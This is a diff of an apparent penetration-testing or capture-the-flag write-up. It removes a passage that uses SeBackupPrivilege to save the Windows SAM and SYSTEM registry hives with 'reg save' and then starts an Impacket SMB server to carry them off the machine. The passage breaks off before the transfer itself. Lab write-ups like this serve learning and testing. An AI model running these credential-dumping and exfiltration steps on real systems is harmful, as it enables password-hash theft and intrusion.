@@ -459,47 +459,5 @@ So none of these credenatials are valid so ill keep enumerating in my RDP sessio
 After opening powershell as as an administrator and checking privs i have the `SeBackupPrivilege` 
 
 ```python
-PS C:\> mkdir Temp
-
-
-    Directory: C:\
-
-
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
-d-----         3/17/2026   4:09 PM                Temp
-
-
-PS C:\> reg save hklm\sam c:\Temp\sam
-The operation completed successfully.
-PS C:\> reg save hklm\system c:\Temp\system
-The operation completed successfully.
-PS C:\> cd Temp
-PS C:\Temp> dir
-
-
-    Directory: C:\Temp
-
-
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--a----         3/17/2026   4:09 PM         110592 sam
--a----         3/17/2026   4:09 PM       17408000 system
-
-
-PS C:\Temp>
-```
-This backed both files up to the `C:\Temp` dir now i will transfer them via SMB
-
-```python
-smbserver.py file-transfer $(pwd) -smb2support
-Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-```
-This setup a SMB share on my system now i can send the files there from my windows powershell session
-
-```python
 
 ```
